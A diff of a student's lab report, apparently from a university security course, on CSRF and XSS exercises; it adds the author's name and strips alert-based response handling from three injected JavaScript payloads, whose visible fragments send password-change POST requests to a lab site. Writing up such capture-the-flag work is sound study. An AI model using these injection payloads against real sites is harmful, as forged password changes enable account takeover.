@@ -1,4 +1,4 @@
-# Lab 1
+# Lab 1 - Nathan Rayburn
 
 ## CSRF Simple
 
@@ -41,14 +41,6 @@ fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin", {
     body: 'password=test',
     method: 'POST'
   })
-  .then(response => {
-    if (response.ok) {
-      alert('Fetch request was successful!');
-    } else {
-      alert('Fetch request failed with status: ' + response.status);
-    }
-  })
-  .catch(error => alert('Fetch error: ' + error));
 ">
 ```
 
@@ -70,14 +62,6 @@ On a pu récupérer le flag en utilisant l'injection via une balise HTML qui nou
     body: 'password=test',
     method: 'POST'
   })
-  .then(response => {
-    if (response.ok) {
-      alert('Fetch request was successful!');
-    } else {
-      alert('Fetch request failed with status: ' + response.status);
-    }
-  })
-  .catch(error => alert('Fetch error: ' + error));
 ">
 ```
 
@@ -122,14 +106,6 @@ L'attaque XSS est déclenchée en injectant du code JavaScript malveillant, qui 
         method: 'POST'
       });
     })
-    .then(response => {
-      if (response.ok) {
-        alert('Password change request was successful!');
-      } else {
-        alert('Password change request failed with status: ' + response.status);
-      }
-    })
-    .catch(error => alert('Fetch error: ' + error));
 ">
 ```
 
